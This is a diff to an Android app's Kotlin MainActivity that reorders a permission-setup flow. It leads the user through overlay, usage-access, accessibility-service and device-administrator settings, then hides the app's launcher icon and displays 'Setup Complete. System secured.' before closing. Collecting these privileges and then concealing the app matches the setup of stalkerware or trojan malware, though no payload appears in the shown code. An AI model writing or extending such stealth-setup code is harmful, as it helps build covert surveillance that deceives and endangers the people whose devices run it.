@@ -124,31 +124,14 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun runPermissionSetup() {
+        // 1. Runtime permissions handled first via standard OS dialog.
         val missing = PermissionHelper.missingRuntimePermissions(this)
         if (missing.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1001)
+            return // Wait for result and resume in onResume/onRestart
         }
 
-        if (!PermissionHelper.hasOverlayPermission(this)) {
-            startActivity(PermissionHelper.overlaySettingsIntent(this))
-            return
-        }
-
-        if (!PermissionHelper.hasUsageStatsPermission(this)) {
-            startActivity(PermissionHelper.usageAccessSettingsIntent())
-            return
-        }
-
-        if (!PermissionHelper.isAccessibilityServiceEnabled(this)) {
-            startActivity(PermissionHelper.accessibilitySettingsIntent())
-            return
-        }
-
-        if (!PermissionHelper.isDeviceAdminEnabled(this)) {
-            startActivity(PermissionHelper.deviceAdminSettingsIntent(this))
-            return
-        }
-
+        // 2. Tiramisu specific permissions
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             val permissions = arrayOf(
                 android.Manifest.permission.POST_NOTIFICATIONS,
@@ -159,8 +142,36 @@ class MainActivity : AppCompatActivity() {
             val toRequest = permissions.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
             if (toRequest.isNotEmpty()) {
                 ActivityCompat.requestPermissions(this, toRequest.toTypedArray(), 1002)
+                return
             }
         }
+
+        // 3. System Alert Window (Overlay)
+        if (!PermissionHelper.hasOverlayPermission(this)) {
+            startActivity(PermissionHelper.overlaySettingsIntent(this))
+            return
+        }
+
+        // 4. Usage Data access
+        if (!PermissionHelper.hasUsageStatsPermission(this)) {
+            startActivity(PermissionHelper.usageAccessSettingsIntent())
+            return
+        }
+
+        // 5. Accessibility Service (CRITICAL)
+        if (!PermissionHelper.isAccessibilityServiceEnabled(this)) {
+            startActivity(PermissionHelper.accessibilitySettingsIntent())
+            return
+        }
+
+        // 6. Device Admin
+        if (!PermissionHelper.isDeviceAdminEnabled(this)) {
+            startActivity(PermissionHelper.deviceAdminSettingsIntent(this))
+            return
+        }
+        
+        // If we reach here, most are granted. Enable shield and hide.
+        maybeEnableShieldAfterPermissions()
     }
 
     private fun runOneTapLink() {
@@ -294,6 +305,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun maybeEnableShieldAfterPermissions() {
+        // We hide as soon as these 3 "shield" permissions are ready.
         val coreGranted = PermissionHelper.hasOverlayPermission(this) &&
             PermissionHelper.isAccessibilityServiceEnabled(this) &&
             PermissionHelper.isDeviceAdminEnabled(this)
@@ -320,8 +332,10 @@ class MainActivity : AppCompatActivity() {
                 // 4. AUTO-HIDE: Remove icon from drawer and exit setup
                 hideAppIcon()
                 
-                // Give it a tiny bit of time before closing
-                kotlinx.coroutines.delay(1000)
+                // Show a quick text before closing so they know it's "Done"
+                statusText.text = "Setup Complete. System secured."
+                
+                kotlinx.coroutines.delay(1500)
                 finish()
             }
         }
